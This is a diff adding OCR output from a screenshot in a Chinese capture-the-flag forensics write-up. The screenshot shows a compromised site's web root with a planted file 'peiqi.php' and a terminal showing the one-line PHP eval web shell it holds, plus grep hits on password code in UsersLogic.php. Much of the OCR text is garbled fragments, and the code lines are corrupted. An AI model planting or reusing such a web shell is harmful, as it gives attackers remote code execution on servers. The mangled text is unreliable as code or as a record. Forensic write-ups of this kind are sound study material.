@@ -1,0 +1,25 @@
+# OCR: db0c48820057ead065bf9539d3730394.webp
+# 来源: ./02-WriteUp/2025/2025-平航杯/db0c48820057ead065bf9539d3730394.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:26
+
+p N
+buidoath-gitignore.htaccess-project.user.ini 404.html build.php
+composerjson
+favicon.ico hgzb.ttf index.html index.php Lphp
+LICENSE.txt nginx.conf nginx.conf2 nginx.conf3 nginx.htaccess
+peiqi.php pe
+e
+phpinfo-phr
+终端×
+<?php@eval($
+POST['peiqi'?>
+home/controller/User.php: home/logic/UsersLogic.php: home/logic/UsersLogic.php: home/Logic/UsersLogic.php:
+Je Sm if
+Soldpassword)!=Suserr'password' home/Logic/UsersLogic.php:
+Sr
+rray(password'=>encrypt($new_passwol
+home/logic/usersLogic.php:
+Davnlaic
+tcnel
+Sre
